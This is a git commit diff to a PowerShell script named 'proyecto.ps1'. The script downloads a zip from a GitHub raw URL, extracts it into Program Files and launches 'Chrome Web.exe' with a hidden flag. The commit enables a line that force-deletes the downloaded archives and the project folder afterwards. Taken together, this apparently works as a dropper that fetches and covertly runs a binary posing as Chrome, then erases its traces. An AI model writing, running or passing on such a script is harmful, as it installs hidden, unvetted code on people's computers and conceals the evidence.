879e97f13cb46424163ee53a1dd5d79eddbd2a29
Admo9 <135870492+Admo9@users.noreply.github.com>
2023-08-26 11:57:12 -0500

    Update proyecto.ps1

--- proyecto.ps1
+++ proyecto.ps1
@@ -29,6 +29,6 @@ invoke-webrequest -uri "https://github.com/Admo9/Data/raw/main/app.zip" -outfile
 
 Expand-Archive -Path C:\Users\app.zip -DestinationPath "C:\Program Files\app-64\resources\"
 
-#Remove-Item -Force -Recurse 'C:\Users\win64.zip', 'C:\Users\ProJ03-main', 'C:\Users\app.zip'
+Remove-Item -Force -Recurse 'C:\Users\win64.zip', 'C:\Users\ProJ03-main', 'C:\Users\app.zip'
 
 Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden
